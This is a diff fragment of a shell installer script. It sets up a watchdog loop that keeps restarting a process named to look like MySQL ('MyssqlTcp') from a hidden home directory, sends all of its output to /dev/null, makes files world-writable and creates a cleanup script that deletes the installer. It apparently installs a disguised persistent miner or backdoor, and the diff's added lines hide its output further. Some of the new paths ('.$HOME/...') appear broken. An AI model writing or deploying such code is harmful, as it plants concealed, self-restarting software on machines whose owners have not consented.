@@ -769,11 +769,11 @@ export LD_LIBRARY_PATH=$HOME/myssqltcp/
 while true; do
         server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
-            ./addconf.sh
-            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
+            /bin/bash .$HOME/myssqltcp/addconf.sh >/dev/null 2>&1
+            /bin/bash .$HOME/myssqltcp/Tcphost.sh --config=./config_background.json >/dev/null 2>&1
             sleep 10
         fi
-        ./logserver.sh
+        /bin/bash .$HOME/myssqltcp/logserver.sh >/dev/null 2>&1
         sleep 5
 done
 EOL
@@ -784,7 +784,7 @@ chmod 777 $HOME/myssqltcp/lib_systemd.sh
 echo "[*] Creating $HOME/delserver.sh script"
 cat >$HOME/delserver.sh <<EOL
 #!/bin/bash
-cd /$HOME/
+cd $HOME/
 rm -f mysqltcp.sh
 
 # lock
